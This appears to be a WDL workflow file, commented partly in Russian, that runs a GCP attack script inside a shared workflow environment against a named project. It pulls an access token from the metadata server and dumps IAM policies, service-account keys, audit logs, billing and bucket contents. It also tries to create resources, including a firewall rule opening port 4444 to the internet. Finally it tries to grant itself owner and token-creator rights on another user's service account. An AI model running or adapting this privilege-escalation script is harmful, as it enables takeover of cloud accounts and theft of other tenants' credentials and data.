version 1.0

workflow DeepEnum {
    call EnumAll
}

task EnumAll {
    command <<<
        echo "=== DEEP GCP ENUMERATION ===" > results.txt
        echo "Date: $(date -u)" >> results.txt
        echo "" >> results.txt

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT="wb-chipper-diamond-3014"

        # =============================================
        # 1. IAM — кто имеет доступ к проекту
        # =============================================
        echo "========================================" >> results.txt
        echo " 1. PROJECT IAM POLICY" >> results.txt
        echo "========================================" >> results.txt
        gcloud projects get-iam-policy $PROJECT --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # IAM policy via API (sometimes returns more)
        echo "=== IAM via API ===" >> results.txt
        curl -s -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:getIamPolicy" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{}' 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 2. Service Accounts — детали
        # =============================================
        echo "========================================" >> results.txt
        echo " 2. SERVICE ACCOUNTS DETAILED" >> results.txt
        echo "========================================" >> results.txt

        # List all SAs with details
        gcloud iam service-accounts list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # For each SA — list keys
        echo "=== SA Keys ===" >> results.txt
        for sa in $(gcloud iam service-accounts list --format="value(email)" 2>/dev/null); do
            echo "--- Keys for $sa ---" >> results.txt
            gcloud iam service-accounts keys list --iam-account="$sa" --format=yaml 2>&1 >> results.txt
            echo "" >> results.txt
        done

        # SA IAM policies (who can use each SA)
        echo "=== SA IAM Policies ===" >> results.txt
        for sa in $(gcloud iam service-accounts list --format="value(email)" 2>/dev/null); do
            echo "--- IAM for $sa ---" >> results.txt
            gcloud iam service-accounts get-iam-policy "$sa" --format=yaml 2>&1 >> results.txt
            echo "" >> results.txt
        done

        # =============================================
        # 3. Cloud Audit Logs — кто что делал
        # =============================================
        echo "========================================" >> results.txt
        echo " 3. CLOUD AUDIT LOGS (last 100)" >> results.txt
        echo "========================================" >> results.txt
        gcloud logging read "logName:activity" --limit=100 --format=yaml --project=$PROJECT 2>&1 >> results.txt
        echo "" >> results.txt

        # Data access logs
        echo "=== Data Access Logs ===" >> results.txt
        gcloud logging read "logName:data_access" --limit=50 --format=yaml --project=$PROJECT 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 4. Billing — расходы Owner'а
        # =============================================
        echo "========================================" >> results.txt
        echo " 4. BILLING INFO" >> results.txt
        echo "========================================" >> results.txt
        gcloud billing projects describe $PROJECT 2>&1 >> results.txt
        echo "" >> results.txt

        # BigQuery billing export (if exists)
        echo "=== BQ Billing Export ===" >> results.txt
        bq ls --format=pretty 2>&1 >> results.txt
        bq ls --all --format=pretty 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 5. Can we CREATE resources?
        # =============================================
        echo "========================================" >> results.txt
        echo " 5. RESOURCE CREATION TESTS" >> results.txt
        echo "========================================" >> results.txt

        # Try create bucket
        echo "=== Create Bucket Test ===" >> results.txt
        gcloud storage buckets create gs://test-writer-privesc-${RANDOM} --location=us-central1 2>&1 >> results.txt
        echo "" >> results.txt

        # Try create SA
        echo "=== Create SA Test ===" >> results.txt
        gcloud iam service-accounts create test-writer-privesc --display-name="test" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try create VM
        echo "=== Create VM Test ===" >> results.txt
        gcloud compute instances create test-privesc --zone=us-central1-a --machine-type=e2-micro --no-user-output-enabled 2>&1 >> results.txt
        echo "" >> results.txt

        # Try create firewall rule
        echo "=== Create Firewall Rule Test ===" >> results.txt
        gcloud compute firewall-rules create test-privesc-rule --allow=tcp:4444 --source-ranges=0.0.0.0/0 --network=network --no-user-output-enabled 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 6. Can we MODIFY IAM?
        # =============================================
        echo "========================================" >> results.txt
        echo " 6. IAM MODIFICATION TESTS" >> results.txt
        echo "========================================" >> results.txt

        SA_SELF=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")

        # Try to grant ourselves owner
        echo "=== Grant Owner Role ===" >> results.txt
        gcloud projects add-iam-policy-binding $PROJECT \
          --member="serviceAccount:${SA_SELF}" \
          --role="roles/owner" 2>&1 >> results.txt
        echo "" >> results.txt

        # Try to grant ourselves SA token creator on Owner's SA
        OWNER_SA="pet-2778175469911ac304b8a@wb-chipper-diamond-3014.iam.gserviceaccount.com"
        echo "=== Grant Token Creator on Owner SA ===" >> results.txt
        gcloud iam service-accounts add-iam-policy-binding "$OWNER_SA" \
          --member="serviceAccount:${SA_SELF}" \
          --role="roles/iam.serviceAccountTokenCreator" 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 7. Cloud Logging — все логи
        # =============================================
        echo "========================================" >> results.txt
        echo " 7. ALL LOGS (recent)" >> results.txt
        echo "========================================" >> results.txt
        gcloud logging read "" --limit=50 --format=yaml --project=$PROJECT 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 8. Compute — подробности
        # =============================================
        echo "========================================" >> results.txt
        echo " 8. COMPUTE DETAILS" >> results.txt
        echo "========================================" >> results.txt

        # All disks
        echo "=== Disks ===" >> results.txt
        gcloud compute disks list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # All images
        echo "=== Images ===" >> results.txt
        gcloud compute images list --no-standard-images --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # Snapshots
        echo "=== Snapshots ===" >> results.txt
        gcloud compute snapshots list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # Instance templates
        echo "=== Instance Templates ===" >> results.txt
        gcloud compute instance-templates list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 9. Networking deep dive
        # =============================================
        echo "========================================" >> results.txt
        echo " 9. NETWORKING" >> results.txt
        echo "========================================" >> results.txt

        # Subnets
        echo "=== Subnets ===" >> results.txt
        gcloud compute networks subnets list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # Routes
        echo "=== Routes ===" >> results.txt
        gcloud compute routes list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # NAT
        echo "=== Cloud NAT ===" >> results.txt
        gcloud compute routers list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # DNS zones
        echo "=== DNS Zones ===" >> results.txt
        gcloud dns managed-zones list --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 10. APIs enabled
        # =============================================
        echo "========================================" >> results.txt
        echo " 10. ENABLED APIs" >> results.txt
        echo "========================================" >> results.txt
        gcloud services list --enabled --format="value(config.name)" 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 11. Test IAM permissions (what can we do?)
        # =============================================
        echo "========================================" >> results.txt
        echo " 11. OUR PERMISSIONS (testIamPermissions)" >> results.txt
        echo "========================================" >> results.txt
        curl -s -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "permissions": [
              "resourcemanager.projects.get",
              "resourcemanager.projects.getIamPolicy",
              "resourcemanager.projects.setIamPolicy",
              "resourcemanager.projects.delete",
              "compute.instances.create",
              "compute.instances.delete",
              "compute.firewalls.create",
              "compute.firewalls.delete",
              "compute.networks.create",
              "storage.buckets.create",
              "storage.buckets.delete",
              "storage.objects.create",
              "storage.objects.delete",
              "storage.objects.get",
              "storage.objects.list",
              "iam.serviceAccounts.create",
              "iam.serviceAccounts.delete",
              "iam.serviceAccounts.getAccessToken",
              "iam.serviceAccounts.getOpenIdToken",
              "iam.serviceAccounts.signBlob",
              "iam.serviceAccountKeys.create",
              "iam.serviceAccountKeys.delete",
              "iam.roles.create",
              "logging.logEntries.list",
              "logging.logs.list",
              "monitoring.timeSeries.list",
              "bigquery.datasets.create",
              "bigquery.jobs.create",
              "cloudsql.instances.create",
              "container.clusters.create",
              "cloudfunctions.functions.create",
              "run.services.create",
              "batch.jobs.create",
              "batch.jobs.get",
              "batch.jobs.list",
              "batch.jobs.delete",
              "secretmanager.secrets.create",
              "secretmanager.versions.access",
              "pubsub.topics.create",
              "dataproc.clusters.create"
            ]
          }' 2>&1 >> results.txt
        echo "" >> results.txt

        # =============================================
        # 12. Owner's workflow data
        # =============================================
        echo "========================================" >> results.txt
        echo " 12. ALL BUCKET CONTENTS (recursive)" >> results.txt
        echo "========================================" >> results.txt
        gcloud storage ls gs://writer-abuse-bkt/ --recursive 2>&1 | head -200 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>

    output {
        File result = "results.txt"
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
